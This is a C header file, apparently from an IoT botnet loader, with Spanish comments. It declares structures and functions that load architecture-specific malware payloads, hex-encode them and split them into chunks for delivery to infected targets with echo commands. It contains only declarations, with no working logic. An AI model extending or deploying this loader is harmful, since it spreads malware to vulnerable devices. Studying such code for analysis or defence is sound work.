/**************************************************************************
 * Archivo: binary.h
 * 
 * Descripción: Gestión de binarios para diferentes arquitecturas.
 * Este módulo proporciona:
 * - Carga y gestión de payloads binarios
 * - Conversión a formato hexadecimal para transmisión
 * - Selección de binarios por arquitectura
 * 
 * El código es crucial para el proceso de infección, ya que maneja
 * la preparación y selección de payloads específicos para cada
 * arquitectura objetivo.
 **************************************************************************/

#pragma once

#include "includes.h"    /* Definiciones comunes */

/**
 * Tamaño máximo de bytes por línea en la conversión a hex
 * Este valor está optimizado para:
 * - Evitar fragmentación excesiva
 * - Mantener líneas de tamaño manejable
 * - Reducir overhead en la transmisión
 */
#define BINARY_BYTES_PER_ECHOLINE   128

/**
 * Estructura que representa un binario para una arquitectura específica
 * 
 * Esta estructura mantiene:
 * - Identificador de arquitectura
 * - Payload convertido a formato hexadecimal
 * - Información de segmentación para transmisión
 * 
 * El payload se divide en fragmentos para facilitar su
 * transmisión mediante el comando echo.
 */
struct binary {
    char arch[6];              /* Identificador de arquitectura (arm, mips, x86, etc.) */
    int hex_payloads_len;      /* Número de fragmentos del payload */
    char **hex_payloads;       /* Array de fragmentos en formato hexadecimal */
};

/***************************************************************************
 * Funciones de inicialización y gestión
 ***************************************************************************/

/**
 * Inicializa el sistema de gestión de binarios
 * 
 * Esta función:
 * 1. Busca binarios disponibles en el directorio de payloads
 * 2. Carga y procesa cada binario encontrado
 * 3. Prepara los payloads para su transmisión
 * 
 * Es crucial ejecutar esta función antes de cualquier operación
 * con binarios.
 * 
 * @return TRUE si la inicialización fue exitosa, FALSE si falló
 */
BOOL binary_init(void);

/**
 * Busca un binario para una arquitectura específica
 * 
 * Esta función recupera el binario apropiado basándose en la
 * arquitectura detectada en el sistema objetivo. Es esencial para:
 * - Seleccionar el payload correcto
 * - Asegurar compatibilidad de ejecución
 * - Evitar errores por incompatibilidad de arquitectura
 * 
 * @param arch  Identificador de arquitectura (e.j., "arm", "mips", "x86")
 * @return      Puntero al binario si existe, NULL si no se encuentra
 */
struct binary *binary_get_by_arch(char *arch);

/***************************************************************************
 * Funciones internas de carga
 ***************************************************************************/

/**
 * Carga y procesa un archivo binario
 * 
 * Función interna que:
 * 1. Lee el contenido del archivo binario
 * 2. Convierte el contenido a formato hexadecimal
 * 3. Segmenta el payload para transmisión
 * 
 * La función es crítica para la preparación de payloads
 * antes de su transmisión al objetivo.
 * 
 * @param bin    Estructura donde cargar el binario
 * @param fname  Nombre del archivo a cargar
 * @return       TRUE si la carga fue exitosa, FALSE si falló
 */
static BOOL load(struct binary *bin, char *fname);
